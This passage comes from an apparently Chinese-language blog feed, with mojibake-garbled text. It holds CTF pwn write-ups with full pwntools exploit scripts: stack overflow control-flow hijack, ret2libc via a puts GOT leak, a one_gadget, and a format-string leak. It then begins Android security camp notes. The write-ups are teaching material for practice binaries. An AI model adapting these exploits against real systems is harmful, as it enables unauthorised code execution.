ˆæº¢å‡ºï¼Œè¿™é‡Œçš„<code>gets(&amp;v5,&quot;&gt;&quot;)</code>å¸¦ç€ä¸€ä¸ª<code>&quot;&gt;&quot;</code>ä¸»è¦æ˜¯idaè¯†åˆ«çš„æ—¶å€™ä¼šæœ‰äº›é—®é¢˜ï¼Œè¿™ä¸ª<code>&quot;&gt;&quot;</code>å­—ç¬¦ä¸²çš„åœ°å€æœ¬æ¥æ˜¯å‰ä¸€ä¸ª<code>write</code>å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿™é‡Œè¯†åˆ«å‡ºé”™å°±æˆäº†getså¸¦ç€ä¸¤ä¸ªå‚æ•°</p><h4 id="è®¡ç®—åç§»é‡"><a href="#è®¡ç®—åç§»é‡" class="headerlink" title="è®¡ç®—åç§»é‡"></a>è®¡ç®—åç§»é‡</h4><p>æ—¢ç„¶çŸ¥é“æ˜¯æ ˆæº¢å‡ºäº†ï¼Œé¦–å…ˆå°±è¦è®¡ç®—åç§»é‡ï¼Œv5ä»<code>[rbp-40h]</code>çš„åœ°æ–¹å¼€å§‹ï¼Œç„¶å<code>[rbp]</code>å¤„è¿˜æœ‰8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æ„é€ çš„payloadå°±åº”è¯¥æ˜¯â€™aâ€™*0x40+â€™bâ€™*0x8+p64(æƒ³è¦åŠ«æŒåˆ°çš„å‡½æ•°åœ°å€)ï¼Œå®ç°ç¨‹åºæµåŠ«æŒ</p><h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><p>å…·ä½“expå¦‚ä¸‹(å› ä¸ºæˆ‘å†™expçš„æ—¶å€™éƒ½æ˜¯ç”¨çš„ä¸€ä¸ªDemo.pyï¼Œæ‰€ä»¥å…·ä½“çš„å®ç°è¿‡ç¨‹åªç”¨çœ‹<code># todo here</code>å³å¯ï¼Œè¿™é‡Œåªæœ‰ä¸¤è¡Œ)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;./warmup&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)<span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =</span><br><span class="hljs-string">Port =</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>ub_offset = <span class="hljs-number">0x3c4b30</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-comment">#log.info(&quot;\033[1;36m&quot; + hex(bin_addr) + &quot;\033[0m&quot;)</span><br><br><span class="hljs-comment"># todo here</span><br>p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0x40060d</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>åé¢çš„é¢˜å°±æ˜¯æƒ³æ‹¿ç»™18çº§åšçš„äº†ï¼Œ19çº§èƒ½æ­èµ·å‰é¢è¿™ä¸ªé¢˜çš„ç¯å¢ƒè¿˜æœ‰æˆåŠŸå¤ç°å°±å¾ˆä¸é”™äº†XD</p><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><h4 id="ç¨‹åºåˆ†æ-1"><a href="#ç¨‹åºåˆ†æ-1" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W95Xq.png" alt="1W95Xq.png"></p><p>å¼€å¯æ ˆä¸å¯æ‰§è¡Œï¼Œæ²¡æœ‰canaryã€PIE</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9h1s.png" alt="1W9h1s.png"></p><p>å…ˆè¾“å…¥åˆ°<code>buf 0xA</code>å­—èŠ‚ï¼Œç„¶å<code>read(0,&amp;s1,0x100)</code>ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œåé¢çš„okå’Œfailæ²¡ä»€ä¹ˆç”¨</p><p>ç”±äºåªæœ‰ä¸€æ¬¡æº¢å‡ºï¼Œç¨‹åºä¹Ÿæ²¡æœ‰åé—¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆleakå‡ºä¸€ä¸ªlibcçš„åœ°å€ï¼Œç„¶åæ¼æ´ç‚¹é‡å¤åˆ©ç”¨ï¼Œå›åˆ°mainï¼Œç„¶året2libc</p><h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h4><p>å…ˆç”¨<code>ROPgadget</code>å¯»æ‰¾<code>gadgetï¼špop rdi ret</code></p><p>ç„¶åç¬¬ä¸€æ¬¡çš„payloadï¼š<code>payload=&#39;a&#39;*0x20+&#39;b&#39;*8+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)</code></p><p>åˆ©ç”¨<code>puts_plt</code>æŠŠ<code>puts</code>å‡½æ•°çš„GOTè¡¨é¡¹æ‰“å‡ºæ¥ï¼Œç„¶åå›åˆ°main</p><p>ç¬¬äºŒæ¬¡æ ¹æ®putså‡½æ•°çš„åœ°å€å’Œå›ºå®šåç§»è®¡ç®—å‡º<code>libc</code>çš„åŠ è½½åœ°å€ï¼Œè‡³äºè¿™äº›åç§»å¯ä»¥åœ¨è„šæœ¬é‡Œé¢å†™<code>symbols[&#39;puts&#39;]</code>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨<code>gdb</code>è°ƒè¯•æ—¶ ï¼šp putsç„¶å<code>vmmap</code>æŸ¥çœ‹åŸºå€ï¼Œç›¸å‡å¾—åˆ°åç§»</p><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><p>å¾—åˆ°åŸºå€ä¹‹åä½¿ç”¨one_gadgetï¼Œæ»¡è¶³é™åˆ¶æ¡ä»¶å³å¯ï¼Œæˆ–è€…åˆ©ç”¨libcé‡Œé¢çš„<code>/bin/sh</code>åœ°å€ï¼Œè°ƒç”¨<code>system</code>ä¹Ÿè¡Œï¼ˆä¸ªäººæ¨èç”¨one_gadgetï¼Œæ–¹ä¾¿å¾ˆå¤šï¼‰</p><p>ç¬¬äºŒæ¬¡çš„payloadï¼š<code>payload=&#39;a&#39;*0x20+&#39;b&#39;*8+p64(libc_base+one_gadget_offset)</code></p><h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;./pwn1&#x27;</span>      <span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary         <span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)    <span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =</span><br><span class="hljs-string">Port =</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>ub_offset = <span class="hljs-number">0x3c4b30</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-comment">#log.info(&quot;\033[1;36m&quot; + hex(bin_addr) + &quot;\033[0m&quot;)</span><br><br><span class="hljs-comment"># todo here</span><br>p.recvuntil(<span class="hljs-string">&#x27;your name\n&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;Coldshield&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;the key?\n&#x27;</span>)<br><br>prdi_ret=<span class="hljs-number">0x00000000004012ab</span><br>puts_GOT=<span class="hljs-number">0x404018</span><br>puts_plt=<span class="hljs-number">0x401030</span><br>main=<span class="hljs-number">0x401162</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)<br><br>p.send(payload)<br><br>puts_offset=<span class="hljs-number">0x6f690</span><br>one_gadget_offset=<span class="hljs-number">0x45216</span><br>p.recvuntil(<span class="hljs-string">&#x27;fail!\n&#x27;</span>)<br>libc_base=my_u64(p.recv(<span class="hljs-number">6</span>))-puts_offset<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + <span class="hljs-string">&#x27;libc_base:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;your name\n&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;Coldshield&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;the key?\n&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(libc_base+one_gadget_offset)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h3><p>è¿™ä¸ªé¢˜æ˜¯æˆ‘å‡ºçš„ä¸€ä¸ªé¢˜ï¼Œå…·ä½“ç»“åˆäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿˜æœ‰æ ˆä¸Šå˜é‡çš„è¦†ç›–</p><h4 id="ç¨‹åºåˆ†æ-2"><a href="#ç¨‹åºåˆ†æ-2" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9bAU.png" alt="1W9bAU.png"></p><p>æ²¡æœ‰canaryå’ŒPIE</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9qNF.png" alt="1W9qNF.png"></p><p><code>read(0,&amp;buf,0x30)</code>å¾ˆæ˜æ˜¾èƒ½æº¢å‡ºåˆ°<code>seed</code>ï¼Œè¦†ç›–å…¶ä¸ºæˆ‘ä»¬æ§åˆ¶çš„å€¼å°±å¯ä»¥é¢„æµ‹rand()äº§ç”Ÿçš„å€¼</p><p>é€šè¿‡éšæœºæ•°æ£€æµ‹ä¹‹åï¼Œä¸‹é¢æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ˜¯å°†æˆ‘ä»¬å‰é¢ç”¨æ¥è¦†ç›–<code>seed</code>è¾“å…¥çš„nameæ‰“å°å‡ºæ¥ï¼Œç›´æ¥æ‰“å°æ ˆä¸Šä»»ä½•å­˜åœ¨çš„ä¸€ä¸ª<code>libc</code>åœ°å€å³å¯ï¼ˆå¯ä»¥ç›´æ¥çœ‹æœ‰æ²¡æœ‰å“ªä¸ªå€¼æ˜¯å±äº<code>libc</code>çš„ï¼‰ï¼Œä½†æ˜¯å…¶ä¸­mainå‡½æ•°çš„è¿”å›åœ°å€å›ºå®šæ˜¯<code>___libc_start_main</code>ä¸­çš„åç§»ï¼Œå…·ä½“è§æˆ‘ä¹‹å‰æš‘å‡å†™çš„ELFæ‰§è¡Œå…¨æµç¨‹ï¼Œæ‰€ä»¥è®¡ç®—å‡ºè°ƒç”¨<code>printf</code>æ—¶è¿™ä¸ªè¿”å›åœ°å€çš„åç§»å³å¯</p><p>payload1(name)ï¼š<code>p.send(&#39;%19$p&#39;.ljust(0x28,&#39;a&#39;)+p64(0))</code></p><p>æœ€åä¸€ä¸ªsay somethingåªèƒ½ä½¿ç”¨<code>one_gadget</code>ï¼Œå› ä¸ºæº¢å‡ºå­—èŠ‚åªåˆ°äº†è¿”å›åœ°å€</p><p>payload2ï¼š<code>payload=&#39;\x00&#39;*0x50+&#39;b&#39;*8+p64(libc_base+0x45216)</code></p><h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;./rand&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)<span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =</span><br><span class="hljs-string">Port =</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>ub_offset = <span class="hljs-number">0x3c4b30</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-comment">#log.info(&quot;\033[1;36m&quot; + hex(bin_addr) + &quot;\033[0m&quot;)</span><br><br><span class="hljs-comment"># todo here</span><br>lib = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>lib.srand(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#gdb.attach(p,&quot;b *0x40081C&quot;)</span><br>p.recvuntil(<span class="hljs-string">&#x27;name?\n&#x27;</span>)<br><br>p.send(<span class="hljs-string">&#x27;%19$p&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p64(<span class="hljs-number">0</span>))<br><br>p.recvuntil(<span class="hljs-string">&#x27;rand game\n&#x27;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>num=lib.rand() % <span class="hljs-number">999</span><br>p.sendline(<span class="hljs-built_in">str</span>(num))<br>p.recvuntil(<span class="hljs-string">&#x27;Win\n&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Your name is:\n&#x27;</span>)<br><br>libc_base=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x20830</span><br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br>payload=<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(libc_base+<span class="hljs-number">0x45216</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;something?\n&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p><code>suctf playfmt</code>åŸé¢˜ï¼Œå¯ä»¥è‡ªå·±ä¸Šç½‘æ‰¾æ‰¾wpï¼Œè‡³äº<code>fopen</code>ä¹‹åä¸ºä»€ä¹ˆèƒ½å¤Ÿè¿™æ ·ä¿®æ”¹åç§»å¯ä»¥æ”¹åˆ°å¯¹åº”çš„flagåœ°å€ï¼Œå¯ä»¥äº†è§£ä¸€ä¸‹IO fileï¼Œä¸è¿‡æ¯”èµ›æ—¶è¿™ç§åç§»å¯ä»¥ç›´æ¥è°ƒè¯•çœ‹å°±å¥½äº†</p><p>å‚è€ƒï¼š<a href="https://cloud.tencent.com/developer/article/1492955">https://cloud.tencent.com/developer/article/1492955</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Androidç§»åŠ¨å®‰å…¨</title>
    <link href="/2020/01/23/android_sec/"/>
    <url>/2020/01/23/android_sec/</url>
    
    <content type="html"><![CDATA[<p><code>2020å¹´xmanå†¬ä»¤è¥-å“ˆå°”æ»¨è¥</code>ï¼Œä»¥â€œç§»åŠ¨å®‰å…¨â€ä¸ºä¸»é¢˜ï¼Œå†…å®¹ä¸»è¦ä¸ºç§»åŠ¨åº”ç”¨å®‰å…¨æ¸—é€æµ‹è¯•ï¼Œç§»åŠ¨åº”ç”¨ç¨‹åºé€†å‘ï¼Œç§»åŠ¨æ¶æ„åº”ç”¨åˆ†æï¼ŒAndroidå†…æ ¸æ¼æ´åˆ†æï¼Œç‰©è”ç½‘Iotè®¾å¤‡æ¼æ´æŒ–æ˜ã€‚<br>æ¦‚è¿°ã€è¯¥æ–‡æ¡£ä»…ä½œä¸ºå­¦ä¹ ç¬”è®°ã€‚</p><ul><li>ç¬¬ä¸€å¤©æ¢†æ¢†å®‰å…¨å¼ å®è€å¸ˆï¼Œä»¥å®‰å“é€†å‘åŸºç¡€ä¸ºä¸»ï¼Œå†…å®¹ä»å®‰å“ç³»ç»Ÿæ¶æ„ä¸è¿è¡Œæœºåˆ¶åˆ°å®‰å“é€†å‘å¸¸ç”¨å·¥å…·ä¸hookæŠ€æœ¯ã€ä»¥åŠå®‰å“å››å¤§ç»„ä»¶ç›¸å…³å®‰å…¨é—®é¢˜ã€‚</li><li>ç¬¬äºŒå¤©è…¾è®¯ç„æ­¦å®éªŒå®¤m4blnè€å¸ˆï¼Œä»¥å®‰å“é€†å‘ä¸ºä¸»ï¼Œè®²è§£äº†é€†å‘æµç¨‹ï¼Œå®‰å“ç«¯çš„é€†å‘ç‰¹ç‚¹ï¼Œä»¥åŠåè°ƒè¯•ã€ä»£ç æ··æ·†ç­‰çŸ¥è¯†ã€‚</li><li>ç¬¬ä¸‰å¤©å®‰å¤©çš„è€å¸ˆï¼Œä»‹ç»äº†å®æˆ˜ä¸­ç§»åŠ¨ç«¯å®‰å…¨ï¼Œä»åœ°ä¸‹äº§ä¸šåˆ°ç§»åŠ¨ç«¯APTå¯¹æŠ—ï¼Œæ›´é«˜çº§çš„apkåˆ†ææ‰‹æ®µã€æ–¹æ³•ï¼Œä»¥åŠç°å®‰å…¨å…¬å¸æ‰€é¢ä¸´éš¾é¢˜ï¼Œå¯¹æœºå™¨å­¦ä¹ åº”ç”¨ä¸ç§»åŠ¨ç«¯å®‰å…¨é¢†åŸŸåšäº†ç®€å•çš„æ¦‚è¿°ã€‚</li><li>ç¬¬å››å¤©å¤æ—¦ç™½æ³½dotsuå¸ˆå‚…åˆ†äº«äº†CTFä¸­çš„å®‰å“ç›¸å…³é—®é¢˜ã€‚</li><li>ç¬¬äº”å¤©åä¸ºçš„æµ·å½’åšå£«ã€æœ¨å­æå¤§å¸ˆå‚…ç»™å¤§å®¶åˆ†äº«äº†åˆ†å¸ƒå¼ç½‘ç»œä»¥åŠåä¸ºåˆ†å¸ƒå¼ç»ˆç«¯ç›¸å…³çŸ¥è¯†ã€ä»‹ç»äº†åŸºäºçŸ­è·é€šä¿¡çš„æ¼æ´æŒ–æ˜åŸºç¡€çŸ¥è¯†ï¼Œå†…å®¹åŒ…æ‹¬Wifiã€Bluetoothã€ç­‰åŸºç¡€çŸ¥è¯†ã€ä»‹ç»æ€§åˆ†æäº†ç»ˆç«¯çš„ç½‘ç»œæ”»å‡»é¢ã€‚ç€é‡è®²è§£äº†ä¿—ç§°p2pç½‘ç»œwifi-directåè®®ã€‚</li><li>ç¬¬å…­å¤©è…¾è®¯ç„æ­¦å®éªŒå®¤åˆ˜æ…§æ˜è€å¸ˆã€é’ˆå¯¹æ›´é«˜çº§çš„çŸ¥è¯†â€”-å®‰å“å†…æ ¸æ¼æ´æŒ–æ˜åšäº†è®²è§£ï¼Œä»‹ç»å®‰å“å†…æ ¸linuxå†…æ ¸åŸºç¡€çŸ¥è¯†ã€å¼€æºåè®®ç­‰ï¼Œé’ˆå¯¹å®‰å“å†…æ ¸æ”»å‡»é¢ä»¥åŠåˆ©ç”¨æ•´ä½“æ€è·¯è¿›è¡Œäº†ç®€å•ä»‹ç»ã€‚é‡ç‚¹è®²è§£dirty cowæ¼æ´åŸç†ã€cve-2019-2215å†…æ ¸æ¼æ´ï¼Œç€é‡ä»‹ç»äº†fuzzæŠ€æœ¯ï¼Œå†…æ ¸fuzzå·¥å…·AFLã€Syzkallerã€‚</li><li>ç¬¬ä¸ƒå¤©ç»“è¥èµ›ã€‚</li></ul><p>æ•´ç†ä¸€ä»½pptä»¥åŠç›¸å…³èµ„æ–™ï¼ˆå“ˆå·¥å¤§è¥ï¼‰ï¼šé“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1b0AfIwxdjDn7aSzgFkNPQQ">https://pan.baidu.com/s/1b0AfIwxdjDn7aSzgFkNPQQ</a> æå–ç ï¼šd4lh</p><h2 id="ç¬¬ä¸€å¤©-01æœˆ13æ—¥"><a href="#ç¬¬ä¸€å¤©-01æœˆ13æ—¥" class="headerlink" title="ç¬¬ä¸€å¤© 01æœˆ13æ—¥"></a>ç¬¬ä¸€å¤© 01æœˆ13æ—¥</h2><h3 id="Androidç³»ç»Ÿæ¶æ„ä¸è¿è¡Œæœºåˆ¶"><a href="#Androidç³»ç»Ÿæ¶æ„ä¸è¿è¡Œæœºåˆ¶" class="headerlink" title="Androidç³»ç»Ÿæ¶æ„ä¸è¿è¡Œæœºåˆ¶"></a>Androidç³»ç»Ÿæ¶æ„ä¸è¿è¡Œæœºåˆ¶</h3><h4 id="äº”å±‚æ¶æ„"><a href="#äº”å±‚æ¶æ„" class="headerlink" title="äº”å±‚æ¶æ„"></a>äº”å±‚æ¶æ„</h4><ul><li><p>åº”ç”¨å±‚ <code>Apps</code></p></li><li><p><code>API</code> å±‚ <code>Java API Framework</code></p><ul><li><code>Content Provider</code>ï¼šå†…å®¹æä¾›å™¨ </li><li><code>View System</code>ï¼šè§†å›¾ç³»ç»Ÿï¼Œæ„å»ºåº”ç”¨åŸºæœ¬ç»„ä»¶</li><li><code>Activity</code>ï¼šæ´»åŠ¨ç®¡ç†</li><li><code>Location</code>ï¼šä½ç½®ç®¡ç†</li><li><code>Package</code>ï¼šåŒ…ç®¡ç†</li><li><code>Notification</code>ï¼šé€šçŸ¥ç®¡ç†</li><li><code>Telephony</code>ï¼šç”µè¯ç®¡ç†</li><li><code>Window</code>ï¼šçª—å£ç®¡ç†</li><li><code>Resource</code>ï¼šèµ„æºç®¡ç†ç³»ç»Ÿè¿è¡Œåº“ Native C&#x2F;C++ Librares</li></ul></li><li><p>ç³»ç»Ÿè¿è¡Œåº“ <code>Native C/C++ Librares</code></p><ul><li><code>C/C++</code>ç¨‹åºåº“</li><li><code>Android</code>è¿è¡Œæ—¶åº“ï¼šæ ¸å¿ƒåº“ã€<code>ART</code></li><li><code>JVM</code>æ˜¯<code>java</code>è™šæ‹Ÿæœºï¼ŒåŸºäºæ ˆï¼Œæ‰§è¡Œ<code>.class</code>å’Œ<code>jar</code>æ–‡ä»¶ã€‚å…¶æ²¡æœ‰å…±äº«æœºåˆ¶ï¼Œä½¿ç”¨<code>JIT</code>ç¼–è¯‘å™¨</li><li><code>DVM</code>æ˜¯åŸºäºå¯„å­˜å™¨çš„è™šæ‹Ÿæœºï¼Œæ‰§è¡Œ<code>dex</code>æ–‡ä»¶ã€‚å…è®¸åœ¨æœ‰é™çš„å†…å­˜ä¸­åŒæ—¶è¿è¡Œå¤šä¸ªè¿›ç¨‹ã€‚ç”±<code>Zygote</code>åˆ›å»ºå’Œåˆå§‹åŒ–ã€‚å…·æœ‰å…±äº«æœºåˆ¶ï¼Œä½¿ç”¨<code>JIT</code>ç¼–è¯‘å™¨</li><li><code>ART</code>(Android 6.0åŠ å…¥)ç³»ç»Ÿæ€§èƒ½æ˜¾è‘—æå‡ï¼Œå¯åŠ¨æ›´å¿«è¿è¡Œæ›´å¿«ï¼Œä½“éªŒæµç•…ï¼Œè§¦æ„Ÿåé¦ˆå³æ—¶ã€‚æ›´é•¿çš„ç”µæ± ç»­èˆªï¼Œæ”¯æŒæ›´ä½çš„ç¡¬ä»¶ã€‚åœ¨<code>apk</code>å®‰è£…æ—¶ä½¿ç”¨é¢„ç¼–è¯‘æŠ€æœ¯</li></ul></li><li><p>ç¡¬ä»¶æŠ½è±¡å±‚ <code>Hardware Abstraction Layer (HAL)</code></p><ul><li>ä½äºæ“ä½œç³»ç»Ÿå†…æ ¸ä¸ç¡¬ä»¶ç”µè·¯ä¹‹é—´çš„æ¥å£å±‚ï¼Œå…¶ç›®çš„åœ¨äºå°†ç¡¬ä»¶æŠ½è±¡åŒ–ã€‚è¿™ç±»ä¼¼äºè®¡ç®—æœºç½‘ç»œé“¾è·¯å±‚ï¼Œå°†ä¸‹é¢ç¡¬ä»¶å°è£…èµ·æ¥ã€‚</li></ul></li><li><p>Linuxå†…æ ¸å±‚ <code>Linux 